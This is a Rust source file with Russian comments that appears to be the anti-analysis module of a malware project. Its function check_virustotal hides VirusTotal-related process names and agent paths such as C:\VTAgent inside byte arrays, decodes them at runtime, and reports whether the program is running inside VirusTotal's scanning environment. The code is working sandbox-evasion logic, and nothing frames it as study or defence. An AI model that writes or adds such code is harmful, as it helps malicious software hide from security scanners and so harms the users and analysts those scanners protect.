use sysinfo::System;
use std::path::Path;

// ищем VT и связаные тулзы, имена декриптуем в рантайме
pub fn check_virustotal() -> bool {
    let vt_names_enc: &[&[u8]] = &[
        &[118, 116, 45], // vt-
        &[118, 105, 114, 117, 115, 116, 111, 116, 97, 108], // virustotal
        &[118, 116, 100, 117, 109, 112], // vtdump
    ];

    let mut vt_names = Vec::new();
    for enc in vt_names_enc {
        let s: String = enc.iter().map(|&b| b as char).collect();
        vt_names.push(s);
    }

    // проверяем процессы
    let mut sys = System::new_all();
    sys.refresh_processes();

    for (_pid, process) in sys.processes() {
        let name = process.name().to_lowercase();
        for vt_name in &vt_names {
            if name.contains(vt_name) {
                return true;
            }
        }
    }

    // проверяем файлы агента
    let path1: String = vec![67u8, 58, 92, 86, 84, 65, 103, 101, 110, 116].iter().map(|&b| b as char).collect();
    let path2: String = vec![67u8, 58, 92, 86, 105, 114, 117, 115, 84, 111, 116, 97, 108].iter().map(|&b| b as char).collect();
    let path3: String = vec![67u8, 58, 92, 80, 114, 111, 103, 114, 97, 109, 32, 70, 105, 108, 101, 115, 92, 86, 84, 65, 103, 101, 110, 116].iter().map(|&b| b as char).collect();

    let vt_files = [path1, path2, path3];

    for file_path in &vt_files {
        if Path::new(file_path).exists() {
            return true;
        }
    }

    false
}
